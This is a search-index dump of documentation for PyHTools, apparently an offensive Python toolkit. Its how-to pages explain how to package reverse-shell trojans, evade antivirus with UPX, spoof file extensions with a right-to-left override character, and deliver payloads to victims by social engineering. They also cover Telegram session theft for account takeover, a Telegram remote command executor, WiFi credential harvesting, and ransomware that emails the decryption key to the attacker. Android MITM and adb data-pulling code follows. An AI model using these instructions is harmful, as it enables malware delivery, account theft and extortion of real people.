{"config":{"lang":["en"],"separator":"[\\s\\-,:!=\\[\\]()\"`/]+|\\.(?!\\d)|&[lg]t;|(?!\\b)(?=[A-Z][a-z])","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to PyHTools Documentation","text":""},{"location":"#installation","title":"Installation","text":"<p>PyHTools can be installed using below options</p> Pip+PyPiPip+Git <ul> <li> <p>Update pip</p> <pre><code>python -m pip install -U pip\n</code></pre> </li> <li> <p>Install PyHTools</p> <pre><code>python -m pip install pyhtools\n</code></pre> </li> <li> <p>Install Extras based on your host machine os</p> WindowsLinux <pre><code>python -m pip install pyhtools[windows]\n</code></pre> <pre><code>python -m pip install pyhtools[linux]\n</code></pre> </li> </ul> <ul> <li> <p>Install using git and pip</p> <pre><code>python -m pip install -U https://github.com/dmdhrumilmistry/pyhtools.git\n</code></pre> </li> </ul>"},{"location":"#usage","title":"Usage","text":"CLIPython Scripts <p>PyHTools can be used from cli with limited tools implemented. UI might not contain all the tools. It can be started using below command</p> <pre><code>pyhtools\n</code></pre> <ul> <li> <p>PyHTools provides several classes for Red and Blue teaming engagements. One can import required packages and build tools according to the requirement On-The-Go.</p> </li> <li> <p>Refer examples for more information</p> </li> </ul>"},{"location":"HowTo/","title":"How To Docs","text":""},{"location":"HowTo/Malwares/CreateTrojanPackage/","title":"Packaging Trojans with any file","text":""},{"location":"HowTo/Malwares/CreateTrojanPackage/#using-app-data","title":"Using App Data","text":""},{"location":"HowTo/Malwares/CreateTrojanPackage/#steps","title":"Steps","text":"<ul> <li>Install Pyinstaller</li> <li>Downloading Icon :</li> <li>Download Icon from IconFinder</li> <li>set filters to free and choose high resolution.</li> <li>download icon</li> <li>Changing downloaded png to ico</li> <li>Visit ICO convert or OnlineConvert.com</li> <li>Upload image</li> <li>choose desired settings</li> <li>convert and download ico file</li> <li> <p>If using requests use 2.5.1</p> <pre><code>pyinstaller --add-data \"path_to_front_file;.\" --icon \"full_icon_path\" --one-file --noconsole -n \"name_of_output_file\" \"path_to_reverse_tcp.py\"\n</code></pre> </li> </ul>"},{"location":"HowTo/Malwares/CreateTrojanPackage/#bypassing-av-using-upx","title":"Bypassing AV using UPX","text":"<ul> <li>Download UPX</li> <li>Extract files</li> <li>Use UPX to compress pyinstaller generated executable</li> <li> <p>Syntax:</p> <pre><code>./upx \"full_path_of_executable\" -o \"full_path_of_compressed_executable\"\n</code></pre> </li> </ul>"},{"location":"HowTo/Malwares/CreateTrojanPackage/#spoofing-file-type","title":"Spoofing File Type","text":"<ul> <li>Copy Right to left override character (U+202E). copy from below or from unicode-explorer website</li> </ul> <pre><code>\u202e \n</code></pre> <ul> <li> <p>file_name-<code>(type_everything_in_reverse_order)</code> and paste copied character after <code>-</code>.</p> </li> <li> <p>eg : sample_pdf-<code>fdp.exe</code></p> <ul> <li>file_name : sample_pdf</li> <li>spoofing_extension : pdf</li> <li>reverse order of spoofing extension : fdp</li> <li>file_extension : exe</li> </ul> </li> <li> <p>spoofed file_name : sample_pdf-\u202efdp.exe</p> </li> <li> <p>Search words ending with exe (if windows executable) and remove <code>-</code> to make trojan to look like a real file.</p> </li> <li>word ending with exe : al<code>exe</code></li> <li>spoofed file_name : spoofed_al<code>exe.pdf</code></li> <li>actual file_name : spoofed_al<code>fdp.exe</code></li> </ul>"},{"location":"HowTo/Malwares/CreateTrojanPackage/#send-file-to-victim","title":"Send File to victim","text":"<ul> <li>Send file to victim through using attacks or social engineering.</li> </ul>"},{"location":"HowTo/Malwares/ReverseBackdoor-HTTP/","title":"HTTP Reverse Shell/Backdoor","text":"<ul> <li>Opens a backdoor on executed device via HTTP protocol</li> </ul>"},{"location":"HowTo/Malwares/ReverseBackdoor-HTTP/#usage","title":"Usage","text":""},{"location":"HowTo/Malwares/ReverseBackdoor-HTTP/#attack-over-lan","title":"Attack over LAN","text":"<ul> <li> <p>Start listener</p> <pre><code>python3 listener.py\n</code></pre> <p>Default port = 8080 Change port in <code>listerner.py</code> on line 33 if another service is using 8080 port</p> </li> <li> <p>Edit <code>IP</code> and <code>PORT</code> values in <code>backdoor.py</code> on line 48</p> <pre><code>IP = 'attacker_local_ip'\nPORT = attacker_port  # 8080\n</code></pre> </li> </ul>"},{"location":"HowTo/Malwares/ReverseBackdoor-HTTP/#attack-over-the-internet","title":"Attack over the internet","text":"<ul> <li> <p>Start a ssh tunnel on attacker's device.</p> <pre><code>ssh -R 80:localhost:&lt;listener_port&gt;\n</code></pre> <p>Note : Replace  with port on which local server is running <li> <p>Copy link that will be available after successfully tunelling between attacker's machine and localhost.run server.</p> <pre><code>example : &lt;random_characters&gt;.localhost.run\n</code></pre> </li> <li> <p>Start Listener on your localhost using</p> <pre><code>python3 listener.py\n</code></pre> </li> <li> <p>Replace copied link in <code>backdoor.py</code> on line 48.</p> <pre><code>IP = '&lt;random_characters&gt;.localhost.run'\n</code></pre> </li> <li> <p>Use social engineering to make user to execute the python file or created standalone executable/trojan. Use python to run backdoor.py script.</p> <pre><code>python3 backdoor.py\n</code></pre> </li> <li> <p>Now use post exploitation tools to gain admin priviliges</p> </li>"},{"location":"HowTo/Malwares/ReverseBackdoor-HTTP/#tested-on","title":"Tested on","text":"<ul> <li>Windows 10</li> <li>Debian based OSes</li> <li>Android Termux</li> </ul>"},{"location":"HowTo/Malwares/ReverseBackdoor-TCP/","title":"TCP backdoor","text":""},{"location":"HowTo/Malwares/ReverseBackdoor-TCP/#change-values-according-to-need","title":"Change Values according to need","text":"<ul> <li> <p>change ip and port to your desired values in listener.py and reverse_backdoor.py</p> </li> <li> <p>run listener.py on attackers machine.</p> </li> <li> <p>run backdoor.py on victims machine.</p> </li> </ul>"},{"location":"HowTo/Malwares/ReverseBackdoor-TCP/#create-a-executablestandalone","title":"Create a executable\\standalone","text":"<ul> <li> <p>pip3 install pyinstaller</p> </li> <li> <p>Creating executable with console:</p> <pre><code>pyinstaller python_file.py --onefile\n</code></pre> </li> <li> <p>Creating executable without console:</p> <pre><code>pyinstaller python_file.py --onefile --noconsole\n</code></pre> </li> </ul> <p>note : noconsole works when we're not using stream like stdin, stdout, stderr, etc. If we're using STDI/O streams then we have to set then to DEVNULL = open(os.devnull, 'wb') then set IOstreams to DEVNULL if using subprocess.check_output then use subprocess.check_output(command, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL). here stdio is being handled by check_output. so no need to handle stdio.</p>"},{"location":"HowTo/Malwares/ReverseBackdoor-TCP/#create-windows-executable-on-linux","title":"Create windows executable on linux","text":"<ul> <li>Install Wine</li> <li>Download Python for windows</li> <li>Install Downloaded python for windows using wine on linux</li> <li>the other commands remain the same to create executable.</li> </ul>"},{"location":"HowTo/Malwares/SendEmail/","title":"Send Email Requirements","text":""},{"location":"HowTo/Malwares/SendEmail/#steps","title":"Steps","text":"<ul> <li>Turn on 2FA</li> <li>Go to GoogleAcc-&gt;Security-&gt;AppPassword-&gt;Custom</li> <li>Copy generated key and use that as password</li> </ul>"},{"location":"HowTo/Malwares/SendEmail/#use-malwaresutils-module","title":"Use malwares.utils module","text":"<pre><code>from pyhtools.malwares.utils import send_mail\nsend_mail(\nemail = 'email.id@domain.com', \npassword = 'your',\nreceiver_mail = 'emails_separated_by_comma',\nmessage = 'your message',\nsmtp_server = 'smtp.gmail.com',\nsmtp_port= 587\n)\n</code></pre>"},{"location":"HowTo/Malwares/TelegramDataHarvester/","title":"How to use Telegram Data Harvester","text":""},{"location":"HowTo/Malwares/TelegramDataHarvester/#steps","title":"Steps","text":"<ul> <li>Create a Gmail App Password</li> <li>update telegram_data_harvester.py lines 64 and 65 with your gmail and App Password</li> <li>Create a executable file or trojan</li> <li>Send to the target</li> <li>You will receive an email with telegram data as a zip when target executes the program/trojan.</li> </ul>"},{"location":"HowTo/Malwares/TelegramDataHarvester/#how-to-use-their-account","title":"How to use their account","text":"<ul> <li>Extract tdata folder from the zip file</li> <li>go to your installed telegram desktop location</li> <li>replace your tdata file with the zip tdata folder</li> <li>Start Telegram Desktop</li> </ul> <p>Tested on Windows 10 and Ubuntu</p>"},{"location":"HowTo/Malwares/TelegramRemoteCodeExecuter/","title":"How to use Telegram Remote Code Executer","text":"<ul> <li>Get Token for bot from Telegram BotFather and update <code>API_KEY</code> on line 7 of <code>TelegramRemoteCodeExecutor.py</code></li> <li>Get Attacker's User ID from UserInfoBot or run TelegramRemoteCodeExecutor.py and use <code>/start</code> command to get user id and then update <code>CHAT_ID</code> on line 8 of <code>TelegramRemoteCodeExecutor.py</code></li> <li>Create trojan/malware using <code>pyinstaller</code> and send it to victim</li> <li>When victims runs malware program, attacker will be notified through the bot on telegram</li> <li>Attacker can use commands to exploit the machine remotely through Telegram over the internet</li> </ul> Command Description Params /start starts interaction with the bot and returns command issuer details None /help returns help menu None /exec executes command on vitcim's machine command /cd change current working directory to specified path path /ls list all the directories and folders in the current working directory None /download download file from the victims machine to attacker's via telegram chat relative or complete file path"},{"location":"HowTo/Malwares/WirelessProfileHarvester/","title":"Wireless Profile Harvester","text":""},{"location":"HowTo/Malwares/WirelessProfileHarvester/#how-to-use","title":"HOW to use","text":"<ul> <li>Read HowTo/Malwares/SendEmail.md to and use app password</li> <li>Update email id and password (app password)</li> <li>Create exe: pyinstaller.exe --onefile --icon='icon_path' -n 'name_of_file' .\\wireless_profile_harvestor.py</li> </ul>"},{"location":"HowTo/Ransomwares/DMSec/","title":"How to use DMSecRansomware","text":""},{"location":"HowTo/Ransomwares/DMSec/#encrypting-data","title":"Encrypting data","text":"<ul> <li>Turn on 2FA in attacker's gmail account.</li> <li>Create app password</li> <li>Update <code>dmsec_encrypter.py</code> with email and app password to login to your gmail account. This is used to receive key to decrypt the files.</li> </ul> <p><pre><code>encrypter = DMSECEncrypter(PATHS, gmail='yourgmailid', passwd='yourapppassword')\n</code></pre> - Specify path which is to be encrypted. - If all the drives are to be decrypted do not pass PATHS to the DMSECEncrypter</p> <p><pre><code>encrypter = DMSECEncrypter(gmail='yourgmailid', passwd='yourapppassword')\n</code></pre> - Create a trojan or use social engineering and send file to the victim. - Wait for victim to execute the trojan.</p>"},{"location":"HowTo/Ransomwares/DMSec/#decrypting-data","title":"Decrypting Data","text":"<ul> <li>Use <code>dmsec_decrypter.py</code> to decrypt the encrypted files.</li> <li>Edit paths to be decrypted in <code>decrypter.py</code> file. If all the drives are to be decrypted do not pass PATHS to DMSECDecrypter</li> </ul> <p><pre><code>encrypter = DMSECDecrypter(KEY)\n</code></pre> - Use the key which was received on mail to decrypt the data</p>"},{"location":"HowTo/Web/vuln-scanner/","title":"Vuln Scanner","text":""},{"location":"HowTo/Web/vuln-scanner/#sqlipy","title":"sqli.py","text":"<ul> <li> <p>Search for php websites using search engine</p> <pre><code>inurl:.php?id\n</code></pre> </li> <li> <p>Use sqli.py to test the WebApp</p> <pre><code>python3 sqli.py -u [url]\n</code></pre> </li> </ul>"},{"location":"HowTo/Web/vuln-scanner/#test-scans","title":"Test Scans","text":""},{"location":"HowTo/Web/vuln-scanner/#test-case-1-testing-on-dvwa-metasploitable","title":"test case 1: Testing on DVWA metasploitable","text":"<ul> <li>target_url = http://10.0.2.30/dvwa</li> <li>login_link = http://10.0.2.30/dvwa/login.php</li> <li>ignore_links = http://10.0.2.30/dvwa/logout.php</li> <li>ld = ['admin','password']</li> </ul> <p>Usage:</p> <pre><code>$ python3 vuln_scanner.py -t http://10.0.2.30/dvwa/ -ig http://10.0.2.30/dvwa/logout.php -l http://10.0.2.30/dvwa/login.php -ld admin,password\n</code></pre>"},{"location":"HowTo/Web/vuln-scanner/#test-case-2-testing-on-mutillidae","title":"Test Case 2: Testing on mutillidae","text":"<p>Usage:</p> <pre><code>$ python3 vuln_scanner.py -t http://10.0.2.30/mutillidae/   </code></pre>"},{"location":"code-docs/android-attackers/","title":"Android Attackers","text":"<p>Contains tools for red and blue team engagements for android devices.</p>"},{"location":"code-docs/android-attackers/#mitm","title":"MITM","text":""},{"location":"code-docs/android-attackers/#certificate-pinner","title":"Certificate Pinner","text":"<p>Helps attacker to pin their certificate to view decrypted intercepted traffic.</p>"},{"location":"code-docs/android-attackers/#pyhtools.attackers.Android.mitm.cert_pin.PinCertificate","title":"<code>PinCertificate</code>","text":"Source code in <code>pyhtools\\attackers\\Android\\mitm\\cert_pin.py</code> <pre><code>class PinCertificate:\ndef __init__(self, apk_path: str,  package_name: str, cert_path: str, frida_binary_path: str, frida_script_path: str, device_name: str, host: str = '127.0.0.1', port: int = 5037,):\n'''Pin Certificate class\n        Args:\n            apk_path (str): apk file path\n            package_name (str): package name of apk file\n            cert_path (str): file path of certificate to be installed\n            frida_binary_path (str): file path of frida binary file\n            frida_script_file (str): file path of cert installer script to be executed in frida after frida installation\n            device_name (str): name of device for adb connection\n            host (str): adb host ip\n            port (int): adb host port\n        Returns:\n            None (None): None\n        '''\n# check data types\nassert type(apk_path) == str\nassert type(package_name) == str\nassert type(cert_path) == str\nassert type(device_name) == str\nassert type(frida_binary_path) == str\nassert type(frida_script_path) == str\nassert type(host) == str\nassert type(port) == int\n# check if files are available at their paths\nif not isfile(apk_path):\nraise FileNotFoundError(f'{apk_path} APK file not found')\nif not isfile(cert_path):\nraise FileNotFoundError(f'{cert_path} Certificate file not found')\nif not isfile(frida_binary_path):\nraise FileNotFoundError(\nf'{frida_binary_path} Frida binary file not found')\nif not isfile(frida_script_path):\nraise FileNotFoundError(\nf'{frida_binary_path} Frida binary file not found')\n# assign values\nself.__device_name = device_name\nself.__apk_path = apk_path\nself.__package_name = package_name\nself.__cert_path = cert_path\nself.__frida_path = frida_binary_path\nself.__frida_script_path = frida_script_path\n# connect to adb server\nself._adb = Client(\nhost=host,\nport=port\n)\n# set initial values\nself.device = self.get_device()\ndef get_device(self):\n'''Get adb device\n        Args:\n            None\n        Returns:\n            ppadb.device.Device: returns specified adb device\n        '''\n_ = self.get_adb_devices()\ndevice: Device = self._adb.device(self.__device_name)\nreturn device\ndef get_adb_devices(self):\n'''returns lis of all adb devices\n        Args:\n            None\n        Returns:\n            list: list of connected adb devices\n        '''\ntry:\ndevices: list[Device] = self._adb.devices()\nif len(devices) == 0:\nraise PinCertificateExceptions.NoDevicesFound(\n\"No ADB Devices Attached\")\nreturn devices\nexcept RuntimeError:\nraise PinCertificateExceptions.ServerNotRunning(\n\"ADB Server is not running, start using `adb start-server`\")\ndef get_frida_devices(self):\n'''Get list of devices running frida\n        Args:\n            None:\n        Returns:\n            list: list of adb connected devices running frida server\n        '''\ndevices = frida.enumerate_devices()\nif len(devices) == 0:\nraise PinCertificateExceptions.NoDevicesFound(\n\"No Frida Devices Found\")\nreturn devices\ndef install_apk(self, force_install: bool = True):\n'''Installs apk on device\n        Args:\n            force_install (bool): if True then uninstalls apk if already installed then installs apk again\n        Returns:\n            bool: True if installed successfully else False\n        '''\nif self.device.is_installed(self.__package_name) and force_install:\nself.device.uninstall(self.__package_name)\nself.device.install(self.__apk_path)\nif self.device.is_installed(self.__package_name):\nreturn True\nreturn False\ndef start_frida(self):\n'''Starts Frida server on target device\n        Args:\n            None\n        Returns:\n            None\n        '''\nasyncio.run(utils.run('adb shell /data/local/tmp/frida-server &amp;'))\ndef pin_certificate(self):\n'''Starts certificate pinning procedure to the apk\n        Args:\n            None\n        Returns:\n            None\n        '''\nlogging.info(\"Starting Certificate Pinning Procedure..\")\n# get device\nself.device: Device = self.get_device()\nlogging.info(f'Connected to {self.__device_name} device')\n# install apk\nlogging.info('Installing package')\nif self.install_apk():\nlogging.info(\nf'{basename(self.__apk_path)} APK installation completed successfully')\nelse:\nlogging.error(\nf'{basename(self.__apk_path)} APK installation failed!')\n# push certificate to the device\nself.device.push(\nsrc=self.__cert_path,\ndest=r'/data/local/tmp/cert-der.crt',\nmode=644\n)\nlogging.info(\nf'{self.__cert_path} certificate pushed to /data/local/tmp/cert-der.crt')\n# push frida binary to the device\nself.device.push(\nsrc=self.__frida_path,\ndest=r'/data/local/tmp/frida-server',\nmode=555\n)\nlogging.info(\nf'{self.__frida_path} frida binary pushed to /data/local/tmp/frida-server')\n# start frida server in different thread\nlogging.info(\"Starting Frida server\")\nfrida_thread = threading.Thread(target=self.start_frida)\nfrida_thread.start()\n# self.device.shell('su /data/local/tmp/frida-server &amp;')\n# Start SSL pinning\nsystem(\nf'frida -U -l {self.__frida_script_path} --no-paus -f {self.__package_name}')\n</code></pre>"},{"location":"code-docs/android-attackers/#pyhtools.attackers.Android.mitm.cert_pin.PinCertificate.__init__","title":"<code>__init__(apk_path, package_name, cert_path, frida_binary_path, frida_script_path, device_name, host='127.0.0.1', port=5037)</code>","text":"<p>Pin Certificate class</p> <p>Parameters:</p> Name Type Description Default <code>apk_path</code> <code>str</code> <p>apk file path</p> required <code>package_name</code> <code>str</code> <p>package name of apk file</p> required <code>cert_path</code> <code>str</code> <p>file path of certificate to be installed</p> required <code>frida_binary_path</code> <code>str</code> <p>file path of frida binary file</p> required <code>frida_script_file</code> <code>str</code> <p>file path of cert installer script to be executed in frida after frida installation</p> required <code>device_name</code> <code>str</code> <p>name of device for adb connection</p> required <code>host</code> <code>str</code> <p>adb host ip</p> <code>'127.0.0.1'</code> <code>port</code> <code>int</code> <p>adb host port</p> <code>5037</code> <p>Returns:</p> Name Type Description <code>None</code> <code>None</code> <p>None</p> Source code in <code>pyhtools\\attackers\\Android\\mitm\\cert_pin.py</code> <pre><code>def __init__(self, apk_path: str,  package_name: str, cert_path: str, frida_binary_path: str, frida_script_path: str, device_name: str, host: str = '127.0.0.1', port: int = 5037,):\n'''Pin Certificate class\n    Args:\n        apk_path (str): apk file path\n        package_name (str): package name of apk file\n        cert_path (str): file path of certificate to be installed\n        frida_binary_path (str): file path of frida binary file\n        frida_script_file (str): file path of cert installer script to be executed in frida after frida installation\n        device_name (str): name of device for adb connection\n        host (str): adb host ip\n        port (int): adb host port\n    Returns:\n        None (None): None\n    '''\n# check data types\nassert type(apk_path) == str\nassert type(package_name) == str\nassert type(cert_path) == str\nassert type(device_name) == str\nassert type(frida_binary_path) == str\nassert type(frida_script_path) == str\nassert type(host) == str\nassert type(port) == int\n# check if files are available at their paths\nif not isfile(apk_path):\nraise FileNotFoundError(f'{apk_path} APK file not found')\nif not isfile(cert_path):\nraise FileNotFoundError(f'{cert_path} Certificate file not found')\nif not isfile(frida_binary_path):\nraise FileNotFoundError(\nf'{frida_binary_path} Frida binary file not found')\nif not isfile(frida_script_path):\nraise FileNotFoundError(\nf'{frida_binary_path} Frida binary file not found')\n# assign values\nself.__device_name = device_name\nself.__apk_path = apk_path\nself.__package_name = package_name\nself.__cert_path = cert_path\nself.__frida_path = frida_binary_path\nself.__frida_script_path = frida_script_path\n# connect to adb server\nself._adb = Client(\nhost=host,\nport=port\n)\n# set initial values\nself.device = self.get_device()\n</code></pre>"},{"location":"code-docs/android-attackers/#pyhtools.attackers.Android.mitm.cert_pin.PinCertificate.get_adb_devices","title":"<code>get_adb_devices()</code>","text":"<p>returns lis of all adb devices</p> <p>Returns:</p> Name Type Description <code>list</code> <p>list of connected adb devices</p> Source code in <code>pyhtools\\attackers\\Android\\mitm\\cert_pin.py</code> <pre><code>def get_adb_devices(self):\n'''returns lis of all adb devices\n    Args:\n        None\n    Returns:\n        list: list of connected adb devices\n    '''\ntry:\ndevices: list[Device] = self._adb.devices()\nif len(devices) == 0:\nraise PinCertificateExceptions.NoDevicesFound(\n\"No ADB Devices Attached\")\nreturn devices\nexcept RuntimeError:\nraise PinCertificateExceptions.ServerNotRunning(\n\"ADB Server is not running, start using `adb start-server`\")\n</code></pre>"},{"location":"code-docs/android-attackers/#pyhtools.attackers.Android.mitm.cert_pin.PinCertificate.get_device","title":"<code>get_device()</code>","text":"<p>Get adb device</p> <p>Returns:</p> Type Description <p>ppadb.device.Device: returns specified adb device</p> Source code in <code>pyhtools\\attackers\\Android\\mitm\\cert_pin.py</code> <pre><code>def get_device(self):\n'''Get adb device\n    Args:\n        None\n    Returns:\n        ppadb.device.Device: returns specified adb device\n    '''\n_ = self.get_adb_devices()\ndevice: Device = self._adb.device(self.__device_name)\nreturn device\n</code></pre>"},{"location":"code-docs/android-attackers/#pyhtools.attackers.Android.mitm.cert_pin.PinCertificate.get_frida_devices","title":"<code>get_frida_devices()</code>","text":"<p>Get list of devices running frida</p> <p>Parameters:</p> Name Type Description Default <code>None</code> required <p>Returns:</p> Name Type Description <code>list</code> <p>list of adb connected devices running frida server</p> Source code in <code>pyhtools\\attackers\\Android\\mitm\\cert_pin.py</code> <pre><code>def get_frida_devices(self):\n'''Get list of devices running frida\n    Args:\n        None:\n    Returns:\n        list: list of adb connected devices running frida server\n    '''\ndevices = frida.enumerate_devices()\nif len(devices) == 0:\nraise PinCertificateExceptions.NoDevicesFound(\n\"No Frida Devices Found\")\nreturn devices\n</code></pre>"},{"location":"code-docs/android-attackers/#pyhtools.attackers.Android.mitm.cert_pin.PinCertificate.install_apk","title":"<code>install_apk(force_install=True)</code>","text":"<p>Installs apk on device</p> <p>Parameters:</p> Name Type Description Default <code>force_install</code> <code>bool</code> <p>if True then uninstalls apk if already installed then installs apk again</p> <code>True</code> <p>Returns:</p> Name Type Description <code>bool</code> <p>True if installed successfully else False</p> Source code in <code>pyhtools\\attackers\\Android\\mitm\\cert_pin.py</code> <pre><code>def install_apk(self, force_install: bool = True):\n'''Installs apk on device\n    Args:\n        force_install (bool): if True then uninstalls apk if already installed then installs apk again\n    Returns:\n        bool: True if installed successfully else False\n    '''\nif self.device.is_installed(self.__package_name) and force_install:\nself.device.uninstall(self.__package_name)\nself.device.install(self.__apk_path)\nif self.device.is_installed(self.__package_name):\nreturn True\nreturn False\n</code></pre>"},{"location":"code-docs/android-attackers/#pyhtools.attackers.Android.mitm.cert_pin.PinCertificate.pin_certificate","title":"<code>pin_certificate()</code>","text":"<p>Starts certificate pinning procedure to the apk</p> <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\Android\\mitm\\cert_pin.py</code> <pre><code>def pin_certificate(self):\n'''Starts certificate pinning procedure to the apk\n    Args:\n        None\n    Returns:\n        None\n    '''\nlogging.info(\"Starting Certificate Pinning Procedure..\")\n# get device\nself.device: Device = self.get_device()\nlogging.info(f'Connected to {self.__device_name} device')\n# install apk\nlogging.info('Installing package')\nif self.install_apk():\nlogging.info(\nf'{basename(self.__apk_path)} APK installation completed successfully')\nelse:\nlogging.error(\nf'{basename(self.__apk_path)} APK installation failed!')\n# push certificate to the device\nself.device.push(\nsrc=self.__cert_path,\ndest=r'/data/local/tmp/cert-der.crt',\nmode=644\n)\nlogging.info(\nf'{self.__cert_path} certificate pushed to /data/local/tmp/cert-der.crt')\n# push frida binary to the device\nself.device.push(\nsrc=self.__frida_path,\ndest=r'/data/local/tmp/frida-server',\nmode=555\n)\nlogging.info(\nf'{self.__frida_path} frida binary pushed to /data/local/tmp/frida-server')\n# start frida server in different thread\nlogging.info(\"Starting Frida server\")\nfrida_thread = threading.Thread(target=self.start_frida)\nfrida_thread.start()\n# self.device.shell('su /data/local/tmp/frida-server &amp;')\n# Start SSL pinning\nsystem(\nf'frida -U -l {self.__frida_script_path} --no-paus -f {self.__package_name}')\n</code></pre>"},{"location":"code-docs/android-attackers/#pyhtools.attackers.Android.mitm.cert_pin.PinCertificate.start_frida","title":"<code>start_frida()</code>","text":"<p>Starts Frida server on target device</p> <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\Android\\mitm\\cert_pin.py</code> <pre><code>def start_frida(self):\n'''Starts Frida server on target device\n    Args:\n        None\n    Returns:\n        None\n    '''\nasyncio.run(utils.run('adb shell /data/local/tmp/frida-server &amp;'))\n</code></pre>"},{"location":"code-docs/android-attackers/#pyhtools.attackers.Android.mitm.cert_pin.PinCertificateExceptions","title":"<code>PinCertificateExceptions</code>","text":"<p>Pin Certificate Exception Class</p> Source code in <code>pyhtools\\attackers\\Android\\mitm\\cert_pin.py</code> <pre><code>class PinCertificateExceptions:\n'''Pin Certificate Exception Class'''\nclass ServerNotRunning(Exception):\n'''Server Not Running Exception Class'''\nclass NoDevicesFound(Exception):\n'''No Devices Found Exception Class'''\n</code></pre>"},{"location":"code-docs/android-attackers/#pyhtools.attackers.Android.mitm.cert_pin.PinCertificateExceptions.NoDevicesFound","title":"<code>NoDevicesFound</code>","text":"<p>         Bases: <code>Exception</code></p> <p>No Devices Found Exception Class</p> Source code in <code>pyhtools\\attackers\\Android\\mitm\\cert_pin.py</code> <pre><code>class NoDevicesFound(Exception):\n'''No Devices Found Exception Class'''\n</code></pre>"},{"location":"code-docs/android-attackers/#pyhtools.attackers.Android.mitm.cert_pin.PinCertificateExceptions.ServerNotRunning","title":"<code>ServerNotRunning</code>","text":"<p>         Bases: <code>Exception</code></p> <p>Server Not Running Exception Class</p> Source code in <code>pyhtools\\attackers\\Android\\mitm\\cert_pin.py</code> <pre><code>class ServerNotRunning(Exception):\n'''Server Not Running Exception Class'''\n</code></pre>"},{"location":"code-docs/android-attackers/#utils","title":"Utils","text":""},{"location":"code-docs/android-attackers/#pyhtools.attackers.Android.mitm.utils.run","title":"<code>run(cmd)</code>  <code>async</code>","text":"<p>run shell command and prints stdout and stderr to console</p> <p>Parameters:</p> Name Type Description Default <code>cmd</code> <code>str</code> <p>command to be executed</p> required <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\Android\\mitm\\utils.py</code> <pre><code>async def run(cmd):\n'''run shell command and prints\n    stdout and stderr to console\n    Args:\n        cmd (str): command to be executed\n    Returns:\n        None\n    '''\nproc = await asyncio.create_subprocess_shell(\ncmd,\nstdout=asyncio.subprocess.PIPE,\nstderr=asyncio.subprocess.PIPE)\nstdout, stderr = await proc.communicate()\n# print(f'[{cmd!r} exited with {proc.returncode}]')\nif stdout:\nprint(f'[stdout]\\n{stdout.decode()}')\nif stderr:\nprint(f'[stderr]\\n{stderr.decode()}')\n</code></pre>"},{"location":"code-docs/android-attackers/#forensics","title":"Forensics","text":""},{"location":"code-docs/android-attackers/#data-harvester","title":"Data Harvester","text":""},{"location":"code-docs/android-attackers/#pyhtools.attackers.Android.forensics.data_harvester.DataHarvester","title":"<code>DataHarvester</code>","text":"<p>Class to harvest data</p> Source code in <code>pyhtools\\attackers\\Android\\forensics\\data_harvester.py</code> <pre><code>class DataHarvester:\n'''Class to harvest data'''\ndef __init__(self, dest_path: str, device_name: str, host: str = '127.0.0.1', port: int = 5037) -&gt; None:\nassert type(dest_path) == str\nassert type(device_name) == str\nassert type(host) == str\nassert type(port) == int\nself.__device_name = device_name\nself.__dest_path = dest_path\nself._adb = Client(\nhost=host,\nport=port\n)\nself.device: Device = self.get_device()\nlogger.info(f'Using {self.__device_name}')\n# check paths, if present remove all files present\nif os.path.isdir(dest_path):\nlogger.warning(\n'Destination Path is already present, complete directory data will be overwritten')\nshutil.rmtree(dest_path)\n# Create Paths\nlogger.info('Creating Destination Path')\nos.makedirs(dest_path)\ndef get_device(self):\n_ = self.get_adb_devices()\ndevice: Device = self._adb.device(self.__device_name)\nreturn device\ndef get_adb_devices(self):\ntry:\ndevices: list[Device] = self._adb.devices()\nif len(devices) == 0:\nraise DataHarvestorExceptions.NoDevicesFound(\n\"No ADB Devices Attached\")\nreturn devices\nexcept RuntimeError:\nraise DataHarvestorExceptions.ServerNotRunning(\n\"ADB Server is not running, start using `adb start-server`\")\ndef __clone_dir(self, phone_src: str):\n# clone directory to host machine\nPopen(\n['adb', 'pull', str(phone_src), str(self.__dest_path)],\nshell=True,\nstdout=PIPE,\nstderr=STDOUT,\n)\ndef start(self):\n# get package paths\nlogger.info('Getting packages list')\npackage_paths = [os.path.join('/data/data/', package_path)\nfor package_path in str(self.device.shell('ls -a /data/data')).splitlines()]\nlogger.info('Harvesting Data')\nfor package_path in package_paths:\nthreading.Thread(target=self.__clone_dir,\nargs=(package_path,)).start()\nlogger.info('Data Harvesting Completed')\n</code></pre>"},{"location":"code-docs/android-attackers/#pyhtools.attackers.Android.forensics.data_harvester.DataHarvestorExceptions","title":"<code>DataHarvestorExceptions</code>","text":"<p>Exceptions for DataHarvester class</p> Source code in <code>pyhtools\\attackers\\Android\\forensics\\data_harvester.py</code> <pre><code>class DataHarvestorExceptions:\n'''\n    Exceptions for DataHarvester class\n    '''\nclass ServerNotRunning(Exception):\n'''Server Not Running Exception'''\npass\nclass NoDevicesFound(Exception):\n'''No Devices Found Exception'''\npass\n</code></pre>"},{"location":"code-docs/android-attackers/#pyhtools.attackers.Android.forensics.data_harvester.DataHarvestorExceptions.NoDevicesFound","title":"<code>NoDevicesFound</code>","text":"<p>         Bases: <code>Exception</code></p> <p>No Devices Found Exception</p> Source code in <code>pyhtools\\attackers\\Android\\forensics\\data_harvester.py</code> <pre><code>class NoDevicesFound(Exception):\n'''No Devices Found Exception'''\npass\n</code></pre>"},{"location":"code-docs/android-attackers/#pyhtools.attackers.Android.forensics.data_harvester.DataHarvestorExceptions.ServerNotRunning","title":"<code>ServerNotRunning</code>","text":"<p>         Bases: <code>Exception</code></p> <p>Server Not Running Exception</p> Source code in <code>pyhtools\\attackers\\Android\\forensics\\data_harvester.py</code> <pre><code>class ServerNotRunning(Exception):\n'''Server Not Running Exception'''\npass\n</code></pre>"},{"location":"code-docs/detectors/","title":"Detectors Documentation","text":"<p>Contains code documentation for <code>pyhtools.Detectors</code></p>"},{"location":"code-docs/detectors/#arp-spoof-detector","title":"ARP spoof detector","text":"<p>Helps to detect ARP spoofing/poisoning attacks in the network</p>"},{"location":"code-docs/detectors/#pyhtools.detectors.arp_spoof_detector.SpoofDetector","title":"<code>SpoofDetector</code>","text":"<p>SpoofDetector class to detect Local MITM attacks</p> Source code in <code>pyhtools\\detectors\\arp_spoof_detector.py</code> <pre><code>class SpoofDetector:\n'''\n    SpoofDetector class to detect 